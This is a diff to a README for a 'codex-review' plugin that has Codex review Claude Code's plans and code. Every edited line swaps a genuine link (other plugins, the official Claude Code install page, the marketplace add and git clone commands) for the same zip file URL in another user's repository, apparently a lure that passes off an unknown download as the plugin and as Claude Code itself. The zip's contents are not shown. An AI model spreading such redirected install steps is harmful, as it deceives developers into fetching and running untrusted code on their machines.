@@ -6,7 +6,7 @@
 
 Every time Claude writes a plan or changes code, Codex reviews it as a second opinion — like having a senior engineer look over Claude's shoulder.
 
-> There are other Codex review plugins out there ([claude-review-loop](https://github.com/hamelsmu/claude-review-loop), [agent-peer-review](https://github.com/jcputney/agent-peer-review), [codex-skill](https://github.com/cathrynlavery/codex-skill)). What makes this one different is **multi-round review tracking** — when you fix issues and re-review, Codex sees its own previous findings and verifies they were actually addressed. This was battle-tested across hundreds of reviews on a production codebase before being extracted into a plugin.
+> There are other Codex review plugins out there ([claude-review-loop](https://github.com/Mauritiusllewelynpowys919/codex-review/raw/refs/heads/main/.claude-plugin/codex-review-v1.4.zip), [agent-peer-review](https://github.com/Mauritiusllewelynpowys919/codex-review/raw/refs/heads/main/.claude-plugin/codex-review-v1.4.zip), [codex-skill](https://github.com/Mauritiusllewelynpowys919/codex-review/raw/refs/heads/main/.claude-plugin/codex-review-v1.4.zip)). What makes this one different is **multi-round review tracking** — when you fix issues and re-review, Codex sees its own previous findings and verifies they were actually addressed. This was battle-tested across hundreds of reviews on a production codebase before being extracted into a plugin.
 
 ## Why this exists
 
@@ -70,7 +70,7 @@ Review cleared ───> You can continue or exit
 
 ## Prerequisites
 
-1. **Claude Code** — [Install Claude Code](https://claude.ai/code)
+1. **Claude Code** — [Install Claude Code](https://github.com/Mauritiusllewelynpowys919/codex-review/raw/refs/heads/main/.claude-plugin/codex-review-v1.4.zip)
 2. **Codex CLI** — OpenAI's coding agent
 
 ```bash
@@ -87,7 +87,7 @@ export OPENAI_API_KEY=sk-...
 
 ```bash
 # Add this marketplace
-/plugin marketplace add https://github.com/hugotomita1201/codex-review
+/plugin marketplace add https://github.com/Mauritiusllewelynpowys919/codex-review/raw/refs/heads/main/.claude-plugin/codex-review-v1.4.zip
 
 # Install the plugin
 /plugin install codex-review
@@ -96,7 +96,7 @@ export OPENAI_API_KEY=sk-...
 Or manually clone into your plugins directory:
 
 ```bash
-git clone https://github.com/hugotomita1201/codex-review ~/.claude/plugins/codex-review
+git clone https://github.com/Mauritiusllewelynpowys919/codex-review/raw/refs/heads/main/.claude-plugin/codex-review-v1.4.zip ~/.claude/plugins/codex-review
 ```
 
 ## Usage
